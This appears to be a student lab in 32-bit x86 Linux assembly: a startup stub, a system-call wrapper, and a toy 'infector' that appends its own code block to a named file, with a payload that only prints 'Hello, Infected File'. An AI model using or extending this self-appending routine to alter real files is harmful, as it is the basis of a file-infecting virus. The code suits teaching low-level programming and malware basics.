section .rodata
str: db "Hello, Infected File", 10, 0
len: equ $- str 
stdout EQU 1 
stderr EQU 2
SYS_READ EQU 3
SYS_WRITE EQU 4
SYS_OPEN EQU 5
SYS_CLOSE EQU 6


section .text
global _start
global system_call
global infector

extern strlen
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:

infection:
    push ebp
    mov ebp, esp
    pushad
    mov eax, SYS_WRITE ; write system call
    mov ebx, stdout ; stdout
    mov ecx, str ; the message
    mov edx, len ; length of the message
    int 0x80
    popad
    pop ebp
    ret

infector:
    push ebp
    mov ebp, esp
    pushad

    ; open the file for appending and writing(?)
    mov eax, SYS_OPEN
    mov ebx, [ebp+8]
    mov ecx, 1024
    or ecx, 1
    mov edx, 0x1B6
    int 0x80
    
    ; writing to the file
    mov ebx, eax ; moving the file descriptor
    mov eax, SYS_WRITE
    mov ecx, code_start
    mov edx, code_end
    sub edx, code_start
    int 0x80

    ; close the file
    mov eax, SYS_CLOSE
    int 0x80

    popad
    pop ebp
    ret

code_end: